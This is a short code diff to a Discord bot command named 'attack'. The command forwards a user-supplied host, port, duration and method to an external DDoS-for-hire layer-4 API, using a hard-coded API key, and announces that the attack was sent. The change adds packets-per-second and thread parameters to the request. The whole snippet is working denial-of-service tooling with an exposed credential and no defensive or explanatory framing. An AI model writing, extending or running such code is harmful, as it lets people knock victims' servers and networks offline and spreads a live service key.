@@ -13,6 +13,6 @@ async def attack(client, fmsg, cmd, args):
 
     # if ipv4_check(args[1]) == 0:
     #     return (await embed(client, "Error", "[x] The IPv4 HOST you've provided is not a valid IPv4!"))
-    api_response = requests.get("https://smack.rip/API/l4?key=5de109cf457b41af0f345baa-10515b73&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=" + args[4]).text
+    api_response = requests.get("https://smack.rip/API/l4?key=5de109cf457b41af0f345baa-10515b73&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=" + args[4] + "&pps=5&threads=4").text
     print(api_response)
     await embed(client, "Attack Sent", f"Attack Successfully sent to " + args[1] + ":" + args[2] + " for " + args[3] + " seconds with " + args[4] + "!")
